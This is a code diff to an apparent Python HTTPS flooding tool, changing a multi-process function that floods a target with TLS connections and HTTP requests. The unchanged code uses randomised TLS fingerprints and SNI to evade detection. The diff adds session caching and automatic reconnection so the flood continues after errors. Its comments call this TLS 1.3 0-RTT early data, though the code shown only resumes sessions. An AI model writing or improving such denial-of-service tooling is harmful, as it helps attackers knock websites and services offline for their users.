@@ -385,7 +385,7 @@ def _make_tls_ctx(proc_idx):
     return ctx
 
 def _mp_https_flood(args_tuple):
-    """Multi-process HTTPS flooder: TLS + HTTP with randomized fingerprint."""
+    """Multi-process HTTPS flooder: TLS 1.3 0-RTT + HTTP with randomized fingerprint."""
     import time as _time
     import ssl as _ssl
     import socket as _socket
@@ -397,8 +397,10 @@ def _mp_https_flood(args_tuple):
         proc_idx = 0
     sent = 0
     errors = 0
-    # TLS handshake with retry + randomized fingerprint
+    # First connection: full TLS handshake, cache session for 0-RTT
     ssock = None
+    cached_session = None
+    ctx = None
     for attempt in range(3):
         try:
             ctx = _make_tls_ctx(proc_idx + attempt * 100)
@@ -409,6 +411,11 @@ def _mp_https_flood(args_tuple):
             # Random SNI (sometimes use IP, sometimes hostname)
             sni = host if _rnd.random() < 0.8 else None
             ssock = ctx.wrap_socket(raw, server_hostname=sni)
+            # Cache session for 0-RTT reuse
+            try:
+                cached_session = ssock.session
+            except Exception:
+                pass
             break
         except Exception:
             try:
@@ -423,6 +430,25 @@ def _mp_https_flood(args_tuple):
     req = _random_http_req(host, path)
     req_counter = 0
     
+    def _reconnect_0rtt():
+        """Reconnect using cached session with 0-RTT early data."""
+        nonlocal ssock, sent
+        try:
+            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            raw.settimeout(3.0)
+            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+            raw.connect((host, port))
+            ssock = ctx.wrap_socket(raw, server_hostname=host)
+            # Load cached session for 0-RTT
+            if cached_session is not None:
+                try:
+                    ssock.session = cached_session
+                except Exception:
+                    pass
+            return True
+        except Exception:
+            return False
+    
     end = _time.time() + duration
     while _time.time() < end:
         try:
@@ -435,7 +461,12 @@ def _mp_https_flood(args_tuple):
                 break
             sent += 1
         except Exception:
-            break
+            # Reconnect with 0-RTT if session cached
+            if cached_session is not None:
+                if not _reconnect_0rtt():
+                    break
+            else:
+                break
     try:
         ssock.close()
     except Exception:
